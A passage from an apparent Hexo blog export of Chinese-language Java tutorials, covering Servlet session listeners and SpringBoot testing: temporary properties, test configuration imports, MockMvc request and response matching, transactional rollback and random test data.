function_">attributeRemoved</span><span class="params">(HttpSessionBindingEvent httpSessionBindingEvent)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;httpSession attribute remove...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attributeReplaced</span><span class="params">(HttpSessionBindingEvent httpSessionBindingEvent)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;httpSession attribute replace...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>测试代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ServletRequest域对象新增属性</span></span><br><span class="line">	request.setAttribute(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;tyt&quot;</span>);</span><br><span class="line">	<span class="comment">// ServletRequest域对象替换属性</span></span><br><span class="line">	request.setAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;划水艺术家&quot;</span>);</span><br><span class="line">	<span class="comment">// ServletRequest域对象移除属性</span></span><br><span class="line">	request.removeAttribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="四、Listener监听HttpSession对象中的JavaBean的状态改变"><a href="#四、Listener监听HttpSession对象中的JavaBean的状态改变" class="headerlink" title="四、Listener监听HttpSession对象中的JavaBean的状态改变"></a>四、Listener监听HttpSession对象中的JavaBean的状态改变</h1><table>
<thead>
<tr>
<th align="left">监听器分类</th>
<th align="left">监听器名称</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Session监听</td>
<td align="left"><code>HttpSessionBindingListener</code></td>
</tr>
<tr>
<td align="left">Session监听</td>
<td align="left"><code>HttpSessionActivationListener</code></td>
</tr>
</tbody></table>
<p>&#x3D;&#x3D;<strong>以上两种监听器不用注册。</strong>&#x3D;&#x3D;<br>&#x3D;&#x3D;<strong>以上两种监听器不用注册。</strong>&#x3D;&#x3D;<br>&#x3D;&#x3D;<strong>以上两种监听器不用注册。</strong>&#x3D;&#x3D;</p>
<h2 id="1-监听HttpSession域对象的绑定与解除"><a href="#1-监听HttpSession域对象的绑定与解除" class="headerlink" title="1. 监听HttpSession域对象的绑定与解除"></a>1. 监听HttpSession域对象的绑定与解除</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyHttpSessionBindingListener</span> <span class="keyword">implements</span> <span class="title class_">HttpSessionBindingListener</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">valueBound</span><span class="params">(HttpSessionBindingEvent arg0)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;HttpSession bound...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">valueUnbound</span><span class="params">(HttpSessionBindingEvent arg0)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;HttpSession unbound...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-监听HttpSession域对象的钝化与活化"><a href="#2-监听HttpSession域对象的钝化与活化" class="headerlink" title="2. 监听HttpSession域对象的钝化与活化"></a>2. 监听HttpSession域对象的钝化与活化</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Bean</span> <span class="keyword">implements</span> <span class="title class_">HttpSessionActivationListener</span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sessionDidActivate</span><span class="params">(HttpSessionEvent arg0)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;HttpSession 活化...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sessionWillPassivate</span><span class="params">(HttpSessionEvent arg0)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;HttpSession 钝化...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>session的钝化活化的用意</strong>：<br>session中的值会很多，并且我们有很长一段时间不会去使用这个内存中的值，那么可以考虑把session中的值存储到硬盘上(钝化)；<br>等下一次要使用的时候，从硬盘上提取到内存中(活化）。</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot测试及web环境模拟测试</title>
    <url>/posts/30ab1de7.html</url>
    <content><![CDATA[<h1 id="一、加载测试专用属性"><a href="#一、加载测试专用属性" class="headerlink" title="一、加载测试专用属性"></a>一、加载测试专用属性</h1><p>在很多测试下需要模拟一些线上情况，或者模拟一些特殊情况。但是在测试过程中，我们能不能每次测试的时候都去修改源码<code>application.yml</code>中的配置进行测试呢？显然是不行的。每次测试前改过来，每次测试后改回去，这太麻烦了。于是我们就想，需要在测试环境中创建一组临时属性，去覆盖我们源码中设定的属性，这样测试用例就相当于是一个独立的环境，能够独立测试，这样就方便多了。</p>
<h2 id="1-临时属性"><a href="#1-临时属性" class="headerlink" title="1. 临时属性"></a>1. 临时属性</h2><p>SpringBoot已经为我们开发者早就想好了这种问题该如何解决，并且提供了对应的功能入口。在测试用例程序中，可以通过对注解<code>@SpringBootTest</code>添加属性来模拟临时属性，具体如下：<br>首先我们先看一下我们的<code>application.yml</code>文件</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">my:</span></span><br><span class="line">  <span class="attr">prop:</span> <span class="string">hello-1</span></span><br></pre></td></tr></table></figure>

<p><strong>未使用临时属性的测试代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SpringBootTest2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;my.prop&#125;&quot;)</span></span><br><span class="line">    String msg;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">contextLoads</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815132642.png" alt=" "></p>
<p><strong>使用临时属性的测试代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest(properties = &#123;&quot;my.prop=hello-2&quot;&#125;)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SpringBootTest2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;my.prop&#125;&quot;)</span></span><br><span class="line">    String msg;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">contextLoads</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过临时属性的设置就能覆盖我们在yml中的属性设置了</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815132649.png" alt=" "></p>
<h2 id="2-临时参数"><a href="#2-临时参数" class="headerlink" title="2. 临时参数"></a>2. 临时参数</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest(args = &#123;&quot;--my.prop=hello-3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SpringBootTest2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;my.prop&#125;&quot;)</span></span><br><span class="line">    String msg;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">contextLoads</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>临时参数就是使用 <code>args</code> 代替 临时属性 <code>properties</code>，同时他在每一个参数前都加上了<code>--</code>。</p>
<p>如果yml、临时属性、临时参数三种配置情况都存在的话SpringBoot会选择哪一种呢，我们来尝试一下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest(args = &#123;&quot;--my.prop=hello-3&quot;&#125;, properties = &#123;&quot;my.prop=hello-2&quot;&#125;)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SpringBootTest2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;my.prop&#125;&quot;)</span></span><br><span class="line">    String msg;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">contextLoads</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815132654.png" alt=" "></p>
<p>答案就是依据<strong>临时参数</strong>。</p>
<hr>
<h1 id="二、加载测试专用配置"><a href="#二、加载测试专用配置" class="headerlink" title="二、加载测试专用配置"></a>二、加载测试专用配置</h1><p>一个Spring环境中可以设置若干个配置文件或配置类，若干个配置信息可以同时生效。现在我们的需求就是在测试环境中再添加一个配置类，然后启动测试环境时，生效此配置就行了。其实做法和Spring环境中加载多个配置信息的方式完全一样。具体操作步骤如下：</p>
<ul>
<li>在测试包test中创建专用的测试环境配置类<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815132732.png" alt=" "></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DBConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">msg</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello-db&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<ul>
<li>在启动测试环境时，导入测试环境专用的配置类，使用<code>@Import</code>注解即可实现</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="meta">@Import(DBConfig.class)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SpringBootTest2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">contextLoads</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815132726.png" alt=" "></p>
<blockquote>
<p>定义测试环境专用的配置类，然后通过<code>@Import</code>注解在具体的测试中导入临时的配置，例如测试用例，方便测试过程，且上述配置不影响其他的测试类环境。</p>
</blockquote>
<hr>
<h1 id="三、Web环境模拟测试"><a href="#三、Web环境模拟测试" class="headerlink" title="三、Web环境模拟测试"></a>三、Web环境模拟测试</h1><p>上述我们都是在数据层与业务层进行测试，那我们可以在表现层上进行测试吗？答案当然是可以。</p>
<p>在对表现层功能进行测试需要一个基础和一个功能。所谓的一个基础是运行测试程序时，必须启动web环境，不然没法测试web功能。一个功能是必须在测试程序中具备发送web请求的能力，不然无法实现web功能的测试。所以在测试用例中测试表现层接口这项工作就转换成了两件事：</p>
<ul>
<li><strong>如何在测试类中启动web测试</strong></li>
<li><strong>如何在测试类中发送web请求</strong></li>
</ul>
<h2 id="1-启动web测试"><a href="#1-启动web测试" class="headerlink" title="1. 启动web测试"></a>1. 启动web测试</h2><p>每一个SpringBoot的测试类上方都会标准<code>@SpringBootTest</code>注解，而注解带有一个属性，叫做<code>webEnvironment</code>。通过该属性就可以设置在测试用例中启动web环境，具体如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SpringBootWebTest</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong><code>webEnvironment</code>属性值解释</strong></p>
<ul>
<li><code>SpringBootTest.WebEnvironment.MOCK</code>：<strong>默认值</strong>，该类型提供一个mock环境，可以和<code>@AutoConfigureMockMvc</code>或<code>@AutoConfigureWebTestClient</code>搭配使用，开启Mock相关的功能。注意此时内嵌的服务（servlet容器）并没有真正启动，也不会监听web服务端口。</li>
<li><code>SpringBootTest.WebEnvironment.NONE</code>：启动一个非web的ApplicationContext，即不提供mock环境，也不提供真实的web服务。</li>
<li><code>SpringBootTest.WebEnvironment.DEFINED_PORT</code>：按照配置的端口启动web环境。</li>
<li><code>SpringBootTest.WebEnvironment.RANDOM_PORT</code>：随机端口启动web环境。</li>
</ul>
</blockquote>
<h2 id="2-测试类中发送请求"><a href="#2-测试类中发送请求" class="headerlink" title="2. 测试类中发送请求"></a>2. 测试类中发送请求</h2><ul>
<li>定义好一个 controller</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/books&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookController</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@GetMapping</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getBook</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;getBook&quot;</span> );</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;hello book&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>模拟web请求调用过程</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)</span></span><br><span class="line"><span class="comment">// 开启虚拟 MVC 调用</span></span><br><span class="line"><span class="meta">@AutoConfigureMockMvc</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SpringBootWebTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义发起虚拟调用的对象MockMVC，通过自动装配的形式初始化对象</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> MockMvc mockMvc;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">testWeb</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建一个虚拟请求对象，封装请求的路径，并使用MockMVC对象发送对应请求</span></span><br><span class="line">        <span class="type">RequestBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> MockMvcRequestBuilders.get(<span class="string">&quot;/book&quot;</span>);</span><br><span class="line">        mockMvc.perform(builder);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，已经成功调用了 BookController。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815132719.png" alt=" "></p>
<h2 id="3-响应状态匹配"><a href="#3-响应状态匹配" class="headerlink" title="3. 响应状态匹配"></a>3. 响应状态匹配</h2><p>在上述我们已经成功发出了请求，但是我们却无法得知表现层的功能是否正常，这就需要我们来进行一个判断。</p>
<p>我们可以把这个过程理解为断言，当程序结果与我们预期相符时，测试通过；当不符时，抛出异常。</p>
<p>在这里，我们可以通过判断响应状态，先来简单判断下 status。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">testWeb</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">	<span class="comment">// 创建一个虚拟请求对象，封装请求的路径，并使用MockMVC对象发送对应请求</span></span><br><span class="line">	<span class="type">RequestBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> MockMvcRequestBuilders.get(<span class="string">&quot;/book&quot;</span>);</span><br><span class="line">	<span class="type">ResultActions</span> <span class="variable">action</span> <span class="operator">=</span> mockMvc.perform(builder);</span><br><span class="line">	<span class="comment">// 设置预期值，与真实值比较. 成功测试通过; 失败测试不通过</span></span><br><span class="line">	<span class="comment">// 定义本次调用成功的状态 200</span></span><br><span class="line">	<span class="type">StatusResultMatchers</span> <span class="variable">status</span> <span class="operator">=</span> MockMvcResultMatchers.status();</span><br><span class="line">	<span class="comment">// 预计本次调用时成功的 状态 200</span></span><br><span class="line">	<span class="type">ResultMatcher</span> <span class="variable">ok</span> <span class="operator">=</span> status.isOk();</span><br><span class="line">	<span class="comment">// 添加预计本次调用过程中进行匹配</span></span><br><span class="line">	action.andExpect(ok);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如此后，控制台输出的仍然和上面一样，那怎么去看状态呢。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815132712.png" alt=" "></p>
<p>我们先来人为制造一个错误，设立一个不存在的路径。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个虚拟请求对象，发送到一个不存在的路径，制造错误</span></span><br><span class="line"><span class="type">RequestBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> MockMvcRequestBuilders.get(<span class="string">&quot;/book11111&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>如下图，当请求发生错误后（即真实结果与我们的预期值不匹配），控制台输出了错误原因。也得到了很多本次请求响应的结果。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815132802.png" alt=" "></p>
<p>通过以上我们也能得出一个结论，当真实值与我们的预期结果<strong>不匹配</strong>时，才会弹出错误。</p>
<h2 id="4-响应体匹配"><a href="#4-响应体匹配" class="headerlink" title="4.  响应体匹配"></a>4.  响应体匹配</h2><ul>
<li>定义一个 controller</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/book&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/one&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Book <span class="title function_">getBook2</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;book get one&quot;</span>);</span><br><span class="line">        <span class="type">Book</span> <span class="variable">book</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Book</span>();</span><br><span class="line">        book.setId(<span class="number">1</span>);</span><br><span class="line">        book.setName(<span class="string">&quot;西游记&quot;</span>);</span><br><span class="line">        book.setPrice(<span class="number">20.0</span>);</span><br><span class="line">        <span class="keyword">return</span> book;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<ul>
<li>发送请求测试</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">testBody</span><span class="params">(<span class="meta">@Autowired</span> MockMvc mockMvc)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">	<span class="type">RequestBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> MockMvcRequestBuilders.get(<span class="string">&quot;/book/one&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">ResultActions</span> <span class="variable">action</span> <span class="operator">=</span> mockMvc.perform(builder);</span><br><span class="line">	<span class="comment">// 设置预期值，与真实值比较，成功测试通过，失测试失败</span></span><br><span class="line">	<span class="comment">// 定义本次调用成功的状态 200</span></span><br><span class="line">	<span class="type">ContentResultMatchers</span> <span class="variable">content</span> <span class="operator">=</span> MockMvcResultMatchers.content();</span><br><span class="line">	<span class="comment">// 预计本次调用时成功的 状态 200</span></span><br><span class="line">	<span class="type">ResultMatcher</span> <span class="variable">resultMatcher</span> <span class="operator">=</span> content.json(<span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;西游记\&quot;,\&quot;id\&quot;:1,\&quot;price\&quot;:20.0&#125;&quot;</span>);</span><br><span class="line">	<span class="comment">// 添加预计本次调用过程中进行匹配</span></span><br><span class="line">	action.andExpect(resultMatcher);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="5-响应头匹配"><a href="#5-响应头匹配" class="headerlink" title="5. 响应头匹配"></a>5. 响应头匹配</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testHeader</span><span class="params">(<span class="meta">@Autowired</span> MockMvc mvc)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">// 创建虚拟请求，当前访问/books</span></span><br><span class="line"><span class="type">MockHttpServletRequestBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> MockMvcRequestBuilders.get(<span class="string">&quot;/book&quot;</span>);</span><br><span class="line"><span class="comment">// 执行请求</span></span><br><span class="line"><span class="type">ResultActions</span> <span class="variable">action</span> <span class="operator">=</span> mvc.perform(builder);</span><br><span class="line"><span class="comment">// 匹配执行状态（是否预期值）</span></span><br><span class="line"><span class="comment">// 定义执行状态匹配器</span></span><br><span class="line"><span class="type">HeaderResultMatchers</span> <span class="variable">header</span> <span class="operator">=</span> MockMvcResultMatchers.header();</span><br><span class="line"><span class="type">ResultMatcher</span> <span class="variable">string</span> <span class="operator">=</span> header.string(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line"><span class="comment">// 使用本次真实值与预期结果对比</span></span><br><span class="line">action.andExpect(string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-完整信息匹配"><a href="#6-完整信息匹配" class="headerlink" title="6. 完整信息匹配"></a>6. 完整信息匹配</h2><p>上述提到的各种响应匹配都可以放在一起来为请求做断言，只要有一个不匹配，程序都会抛出异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testGetById</span><span class="params">(<span class="meta">@Autowired</span> MockMvc mvc)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">	<span class="type">MockHttpServletRequestBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> MockMvcRequestBuilders.get(<span class="string">&quot;/book&quot;</span>);</span><br><span class="line">	<span class="type">ResultActions</span> <span class="variable">action</span> <span class="operator">=</span> mvc.perform(builder);</span><br><span class="line">	</span><br><span class="line">	<span class="type">StatusResultMatchers</span> <span class="variable">status</span> <span class="operator">=</span> MockMvcResultMatchers.status();</span><br><span class="line">	<span class="type">ResultMatcher</span> <span class="variable">ok</span> <span class="operator">=</span> status.isOk();</span><br><span class="line">	action.andExpect(ok);</span><br><span class="line">	</span><br><span class="line">	<span class="type">HeaderResultMatchers</span> <span class="variable">header</span> <span class="operator">=</span> MockMvcResultMatchers.header();</span><br><span class="line">	<span class="type">ResultMatcher</span> <span class="variable">string</span> <span class="operator">=</span> header.string(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">	action.andExpect(string);</span><br><span class="line">	</span><br><span class="line">	<span class="type">ContentResultMatchers</span> <span class="variable">content</span> <span class="operator">=</span> MockMvcResultMatchers.content();</span><br><span class="line">	<span class="type">ResultMatcher</span> <span class="variable">result</span> <span class="operator">=</span> content.json(<span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;西游记\&quot;,\&quot;id\&quot;:1,\&quot;price\&quot;:20.0&#125;&quot;</span>);</span><br><span class="line">	action.andExpect(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="四、数据层测试数据回滚"><a href="#四、数据层测试数据回滚" class="headerlink" title="四、数据层测试数据回滚"></a>四、数据层测试数据回滚</h1><p>测试用例如果测试时产生了事务提交就会在测试过程中对数据库数据产生影响，进而产生垃圾数据。这个过程不是我们希望发生的，作为开发者测试用例该运行运行，但是过程中产生的数据不要在我的系统中留痕，这样该如何处理呢？</p>
<p>SpringBoot早就为开发者想到了这个问题，并且针对此问题给出了最简解决方案，在原始测试用例中添加注解<code>@Transactional</code>即可实现当前测试用例的事务不提交。</p>
<p>程序运行后，若注解<code>@SpringBootTest</code>出现的位置存在注解<code>@Transactional</code>，SpringBoot就会认为这是一个测试程序，无需提交事务，所以也就可以避免事务的提交。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="meta">@Rollback(true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DaoTest</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BookService bookService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">testSave</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Book</span> <span class="variable">book</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Book</span>();</span><br><span class="line">        book.setName(<span class="string">&quot;红楼梦&quot;</span>);</span><br><span class="line">        book.setId(<span class="number">2</span>);</span><br><span class="line">        book.setPrice(<span class="number">20.0</span>);</span><br><span class="line">        bookService.save(book);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在SpringBoot的测试类中通过添加注解<code>@Transactional</code>来阻止测试用例提交事务</li>
<li>通过注解<code>@Rollback</code>控制SpringBoot测试类执行结果是否提交事务，当为 <code>true</code> 时，回滚事务；<code>false</code>，不回滚事务。需要配合注解@Transactional使用</li>
</ul>
<hr>
<h1 id="五、测试用例数据设定"><a href="#五、测试用例数据设定" class="headerlink" title="五、测试用例数据设定"></a>五、测试用例数据设定</h1><p>对于测试用例的数据固定书写肯定是不合理的，SpringBoot提供了在配置中使用随机值的机制，确保每次运行程序加载的数据都是随机的。具体如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">testCase:</span></span><br><span class="line">  <span class="attr">book:</span></span><br><span class="line">    <span class="attr">id:</span> <span class="string">$&#123;random.int&#125;</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">$&#123;random.value&#125;</span></span><br><span class="line">    <span class="attr">price:</span> <span class="string">$&#123;random.int&#125;</span></span><br></pre></td></tr></table></figure>


<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;testcase.book&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookCase</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Double price;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="meta">@Rollback(true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DaoTest</span> &#123;</span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="keyword">private</span> BookService bookService;</span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="keyword">private</span> BookCase bookCase;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Test</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">testSave</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="type">Book</span> <span class="variable">book</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Book</span>();</span><br><span class="line">		book.setName(bookCase.getName());</span><br><span class="line">		book.setId(bookCase.getId());</span><br><span class="line">		